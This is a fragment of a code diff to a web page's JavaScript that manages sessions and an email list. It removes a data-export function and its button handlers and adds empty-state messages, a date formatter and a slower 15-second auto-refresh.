+            await fetch('/api/sessions/clear', { method: 'DELETE' });
+            currentSessionId = null;
             await loadSessions();
-            alert('All sessions cleared');
+            document.getElementById('emailList').innerHTML = '<div class="empty-state">All sessions cleared. Add a new account to start.</div>';
+            document.getElementById('currentEmailDisplay').innerHTML = 'No session selected';
         }
     }
-
-    async function exportData() {
-        const data = await apiCall('/api/sessions/export');
-        if (data) {
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `sessions_export_${new Date().toISOString()}.json`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }
-    }
-
+    
     function escapeHtml(str) {
         if (!str) return '';
-        return String(str).replace(/[&<>]/g, function(m) {
+        return str.replace(/[&<>]/g, function(m) {
             if (m === '&') return '&amp;';
             if (m === '<') return '&lt;';
             if (m === '>') return '&gt;';
             return m;
         });
     }
-
-    // Event handlers
-    document.getElementById('refreshSessionsBtn').onclick = loadSessions;
-    document.getElementById('refreshTableBtn').onclick = loadSessions;
-    document.getElementById('clearAllSessionsBtn').onclick = clearAllSessions;
-    document.getElementById('exportDataBtn').onclick = exportData;
     
-    // Auto-refresh every 10 seconds
-    setInterval(loadSessions, 10000);
+    function formatDate(dateStr) {
+        if (!dateStr) return 'Unknown';
+        const date = new Date(dateStr);
+        const now = new Date();
+        if (date.toDateString() === now.toDateString()) {
+            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        }
+        return date.toLocaleDateString();
+    }
+    
+    // Auto-refresh sessions every 15 seconds
+    setInterval(loadSessions, 15000);
     
     // Initial load
     loadSessions();
